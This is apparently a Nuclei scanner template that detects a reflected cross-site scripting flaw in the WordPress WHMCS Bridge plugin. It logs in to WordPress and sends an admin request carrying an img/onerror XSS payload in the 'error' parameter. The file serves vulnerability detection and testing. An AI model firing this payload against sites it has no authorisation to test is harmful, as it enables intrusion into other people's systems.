id: wp-whmcs-xss
info:
  author: dhiyaneshDk
  description: The plugin does not sanitise and escape the error parameter before
    outputting it back in admin dashboard, leading to a Reflected Cross-Site Scripting
  name: WHMCS Bridge < 6.4b - Reflected Cross-Site Scripting (XSS)
  reference:
  - https://wpscan.com/vulnerability/4aae2dd9-8d51-4633-91bc-ddb53ca3471c
  severity: medium
  tags: wordpress,wp-plugin,authenticated,whmcs,xss
requests:
- cookie-reuse: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <strong><img src onerror=alert(document.domain)></strong>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
